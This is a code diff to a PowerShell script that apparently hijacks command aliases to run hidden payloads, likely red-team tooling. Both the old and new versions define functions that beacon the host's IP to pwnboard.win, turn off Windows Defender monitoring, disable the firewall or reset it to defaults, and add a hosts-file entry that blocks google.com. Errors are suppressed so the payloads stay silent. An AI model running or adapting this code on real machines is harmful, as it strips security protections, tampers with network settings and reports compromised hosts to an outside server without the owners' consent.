@@ -1,21 +1,21 @@
 $mm = @'
-function mm {try {$i=(Test-Connection -ComputerName $env:ComputerName -Count 1).IPV4Address.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic"  -ErrorAction SilentlyContinue -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
+function mm {try {$i=(Test-Connection -ComputerName $env:ComputerName -Count 1).IPV4Address.IPAddressToString;$p=@{"ip"="192.168.0.5";"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic"  -ErrorAction SilentlyContinue -TimeOutSec 2 -Method Post -UseBasicParsing -Body $p -ContentType "application/json" | Out-Null}Catch{$_}}
 '@.Trim()
 $dd = @'
-function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
+function dd {Start-Job -ScriptBlock {try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue }Catch{$_}} | Out-Null }
 '@.Trim()
 $ff = @'
-function ff {try{Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue | Out-Null}Catch{}}
+function ff {Start-Job -ScriptBlock {try{(New-Object -ComObject HNetCfg.FwPolicy2).RestoreLocalFirewallDefaults()}Catch{$_}} | Out-Null}
 '@.Trim()
 $xx = @'
-function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue |ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue -Value "`r`n0.0.0.0    www.google.com google.com" | Out-Null}Catch{}}}Catch{}}
+function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue |ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue -Value "`r`n0.0.0.0    www.google.com google.com" }Catch{}}}Catch{$_}}
 '@.Trim()
 
 $orig_dct = @{ }
 function cool() {
     param([parameter(ValueFromPipeline)][string]$cmd)
-    if ($cmd -match "gin" -or $cmd -match "stz" -or $cmd -match "gtz" -or $cmd -match "write") {
-        # Not shimming as newGuid() uses gin alias and that breaks things
+    if ($cmd -match "gin" -or $cmd -match "scb" -or $cmd -match "%" -or $cmd -match "stz" -or $cmd -match "gtz" -or $cmd -match "write" -or $cmd -match "where" -or $cmd -match "foreach") {
+        # These can break things so will skip
         return;
     }
     $value = (Get-Alias -Name $cmd).Definition
